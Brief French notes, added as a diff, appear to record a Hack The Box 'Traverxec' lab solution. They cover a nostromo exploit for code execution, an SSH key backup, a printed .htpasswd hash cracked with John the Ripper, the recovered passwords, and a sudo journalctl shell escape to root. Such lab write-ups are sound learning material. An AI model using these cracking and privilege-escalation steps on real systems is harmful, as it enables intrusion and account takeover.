@@ -1,0 +1,18 @@
+version du framework utilise vulnerable au poc exploit.py permet d'avoir code exec as www-data
+
+dans le fichier /tmp on y trouve backup-ssh-identity-files.tgz
+une fois decompresse on a le .ssh de davis avec son id_rsa dans (dans el dossier) manque a trouver la passphrase pour se co en ssh 
+
+une fois le fichier /var/nostromo/conf/.htpasswd trouve :
+	david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+~/JohnTheRipper/run/john --wordlist=/home/floki/HackTheBox/tools/rockyou.txt ~/HackTheBox/traverxec/crack.txt
+david:Nowonly4me
+
+avec le id_rsa on peut se co a davis avec la passphrase HackTheBox/traverxec/id_rsa:hunter merci john :D
+
+use fois log as david :
+	/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+	!/bin/sh
+
+rooted 
